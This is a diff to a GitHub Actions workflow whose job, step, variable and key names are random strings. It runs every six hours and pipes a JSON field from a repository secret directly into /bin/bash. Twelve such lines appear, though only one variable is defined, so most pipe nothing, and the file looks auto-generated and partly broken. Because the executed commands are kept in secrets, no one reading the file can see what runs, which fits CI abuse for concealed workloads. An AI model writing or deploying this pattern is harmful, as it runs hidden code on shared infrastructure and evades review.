@@ -1,21 +1,29 @@
 name: gaoyaguo2603
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 3/6 * * *'
-
+    - cron: '24 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gaoyaguo2603
         env:
-          q02294: ${{ secrets.q02294 }}
+          ddl8305: ${{ secrets.ddl8305 }}
         run: |
-          echo $q02294 | jq -r .wttpk1611 | /bin/bash
-          echo $mh55393 | jq -r .ri79 | /bin/bash
-          echo $tkcs749 | jq -r .mvosy649 | /bin/bash
-          echo $atu46358 | jq -r .bz229 | /bin/bash
-          echo $al29009 | jq -r .u0743 | /bin/bash
+          echo $ddl8305 | jq -r .gq6 | /bin/bash
+          echo $n2305 | jq -r .qbhdh68 | /bin/bash
+          echo $uu62 | jq -r .frkl43806 | /bin/bash
+          echo $rxrx66432 | jq -r .ku250 | /bin/bash
+          echo $fwr069 | jq -r .h05143 | /bin/bash
+          echo $sfd3182 | jq -r .onng8 | /bin/bash
+          echo $yyope9452 | jq -r .ifbku861 | /bin/bash
+          echo $ed58545 | jq -r .uzjq85 | /bin/bash
+          echo $lec4471 | jq -r .e2 | /bin/bash
+          echo $dxi03 | jq -r .fkud234 | /bin/bash
+          echo $m5 | jq -r .i7193 | /bin/bash
+          echo $ttk24 | jq -r .gdzwm80 | /bin/bash
 
